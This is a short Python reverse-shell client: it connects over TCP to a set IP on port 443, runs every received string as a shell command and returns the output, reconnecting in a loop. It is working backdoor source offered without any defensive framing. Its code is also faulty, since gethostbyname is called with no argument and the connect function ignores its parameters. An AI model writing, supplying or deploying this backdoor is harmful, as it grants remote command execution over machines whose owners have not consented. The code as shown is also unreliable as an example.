import socket
import subprocess
from time import sleep

def get_local_ip():
    try:
        hostname = socket.gethostbyname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except Exception as e:
        print(f'erro ao obeter ip {e}')
        return '127.0.0.1'
IP = get_local_ip()
PORT = 443

def connet(ip,port):
    try:
        c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        c.connect((IP,PORT))
        return c
    except Exception as e:
        print(f'connection error: {e}')


def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == '/sair':
                return
            else:
                cmd(c,data)

    except Exception as e:
        print(f'listen funcion error:{e}')

def cmd(c,data):
    try:
        p =  subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE ,
            stderr=subprocess.PIPE ,
            stdout=subprocess.PIPE
        )
        c.send(
            p.stdout.read() + p.stderr.read() + b'\n'
        )

    except Exception as e:
        print(f'cmd function error:{e}')

if __name__=='__main__':
    try:
        while True:
            client = connet(IP,PORT)
            if client:
                listen(client)
            else:
                sleep(.5)

    except KeyboardInterrupt:
        print('progeam stoppedby the user')

    except Exception as error:
        print(f'main connetion {error}')
